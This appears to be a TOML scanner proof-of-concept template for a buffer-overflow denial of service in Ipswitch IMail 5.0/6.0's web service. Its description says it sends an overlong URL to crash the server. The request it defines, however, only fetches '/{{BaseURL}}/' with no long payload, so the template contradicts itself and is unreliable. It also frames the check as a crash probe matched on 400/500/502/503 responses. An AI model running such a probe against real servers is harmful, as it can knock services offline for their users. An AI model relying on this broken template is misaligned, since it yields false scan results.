[info]
author = "ave"
description = "Ipswitch IMail 5.0/6.0 的 Web 服务在处理 HTTP 请求 URL 时未校验长度，发送超长 URL 可触发缓冲区溢出导致服务崩溃。本 PoC 通过向目标 Web 端口发送一个携带超长路径的 GET 请求，观察服务是否返回异常响应或连接被重置/超时（安全无损验证，不持续重放）。"
id = "POC-AVE-1999-1179"
name = "Ipswitch IMail 5.0/6.0 Web Service Buffer Overflow DoS PoC"
severity = "medium"
tags = ["ave-1999-1179"]
vuln_id = [
    "CVE-1999-1551",
    "AVE-1999-1179",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    400,
    502,
    503,
]
type = "status"
